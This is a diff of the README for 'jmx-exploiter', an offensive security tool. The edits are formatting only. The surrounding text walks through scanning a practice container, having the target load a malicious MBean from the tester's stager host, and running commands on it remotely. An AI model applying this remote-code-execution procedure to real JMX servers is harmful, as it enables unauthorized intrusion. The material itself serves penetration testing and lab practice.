@@ -26,14 +26,14 @@ and interaction for you.
 *jmx-exploiter* is a *Maven* project. This makes the installation a straight forward process and no manual installation of libraries
 should be required. First of all, make sure that you have *maven* installed on your system:
 
-```bash
-sudo apt install maven      # Debian
-pacman -s maven             # Arch
+```console
+$ sudo apt install maven      # Debian
+$ pacman -s maven             # Arch
 ```
 
 Then, clone the *jmx-exploiter* project in a location of your choice and run ``mvn package`` inside of the projects folder.
 
-```bash
+```console
 [pentester@kali opt]$ cd jmx-exploiter/
 [pentester@kali jmx-exploiter]$ mvn package
 [INFO] Scanning for projects...
@@ -50,7 +50,7 @@ Theoretically you can deploy any *MBean* object that fulfills the *MBean Specifi
 implementation, the [tonka-bean](./tonka-bean/). The *tonka-bean* is a separate maven project and you can compile it in the same way as
 you compiled *jmx-exploiter*:
 
-```bash
+```console
 [pentester@kali jmx-exploiter]$ cd tonka-bean/
 [pentester@kali tonka-bean]$ mvn package
 [INFO] Scanning for projects...
@@ -64,7 +64,7 @@ you compiled *jmx-exploiter*:
 
 After *maven* has finished, you should find the executable *.jar* files in the target folders of the corresponding projects.
 
-```bash
+```console
 [pentester@kali opt]$ ls -l jmx-exploiter/target/jmx-exploiter.jar 
 -rw-r--r-- 1 pentester pentester 64393 Nov  5 07:21 jmx-exploiter/target/jmx-exploiter.jar
 [pentester@kali opt]$ ls -l jmx-exploiter/tonka-bean/target/tonka-bean.jar 
@@ -75,7 +75,7 @@ After *maven* has finished, you should find the executable *.jar* files in the t
 in your path and the completion scripts need to be sourced on bash startup. This repository contains a small [installation script](/resoruces/install.sh)
 that takes care of these things.
 
-```bash
+```console
 [pentester@kali resources]$ bash install.sh 
 [+] Creating local completion script ~/.bash_completion
 [+] Creating local completion folder ~/.bash_completion.d
@@ -96,7 +96,7 @@ can be found inside this repository and should enable you to practice the usage 
 
 The listing below shows the nmap output for the corresponding container. Using the NSE-Script *rmi-dumpregistry* you can verify that port 9010 is running a *JMX* agent.
 
-```bash
+```console
 [pentester@kali opt]$ sudo nmap -sV 172.30.0.2
 Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-05 07:24 CET
 Nmap scan report for 172.30.0.2
@@ -129,7 +129,7 @@ of *Tomcat users* are accessible over the *JMX* interface:
 
 However, with *jmx-exploiter* your first step is to launch the *status* command on the remote *JMX* endpoint:
 
-```bash
+```console
 [pentester@kali target]$ ./jmx-exploiter.jar 172.30.0.2 9010 status
 [+] Connecting to JMX server... done!
 [+] Creating MBeanServerConnection... done!
@@ -147,7 +147,7 @@ the remote server needs to establish a HTTP connection to your listener. Therefo
 that looks like the one in the ``src`` folder of the project. The configuration file does also allow you to specify advanced options, like controlling the name of 
 the deployed *MBean*. Lastly, make sure that the *MBean* you want to deploy can be found in the path that is specified in your configuration file (default is: ``/opt/jmx-exploiter/tonka-bean/target/``).
 
-```bash
+```console
 [pentester@kali deploy]$ ls
 config.properties  jmx-exploiter.jar  tonka-bean
 [pentester@kali deploy]$ cat config.properties 
@@ -184,7 +184,7 @@ stagerHost=172.30.0.1
 The output suggests that the deployment worked like expected. You can verify this situation either by using the *status* command again, or by searching your *MBean*
 inside of *jconsole*:
 
-```bash
+```console
 [pentester@kali deploy]$ ./jmx-exploiter.jar 172.30.0.2 9010 status
 [+] Connecting to JMX server... done!
 [+] Creating MBeanServerConnection... done!
@@ -201,7 +201,7 @@ inside of *jconsole*:
 If you deployed your own malicious *MBean*, you can now invoke your *MBean* methods directly from *jconsole*. While this is also possible for the *tonka-bean*, *jmx-exploiter*
 also supports options to interact with the *tonka-bean* from the command line:
 
-```bash
+```console
 [pentester@kali deploy]$ ./jmx-exploiter.jar 172.30.0.2 9010 execute --exec id 
 [+] Connecting to JMX server... done!
 [+] Creating MBeanServerConnection... done!
@@ -213,7 +213,7 @@ also supports options to interact with the *tonka-bean* from the command line:
 Once you are done with your *MBean*, you should make sure to undeploy all changes that you have made to the server. At least you should remove your malicious *MBean* from the server, 
 but if *MLet* was not available when you started, you should also remove the *MLet*. *jmx-exploiter* makes the cleanup pretty easy, by just invoking:
 
-```bash
+```console
 [pentester@kali deploy]$ ./jmx-exploiter.jar -c config.properties 172.30.0.2 9010 undeployAll
 [+] Connecting to JMX server... done!
 [+] Creating MBeanServerConnection... done!
@@ -345,4 +345,4 @@ restore the clean state of the *JMX* endpoint.
 * For the JMXMP implementation, the tools provided by [nickman](https://github.com/nickman) were really helpful.
 
 
-Copyright 2019, Tobias Neitzel and the jmx-exploiter contributors.
+Copyright 2020, Tobias Neitzel and the *jmx-exploiter* contributors.
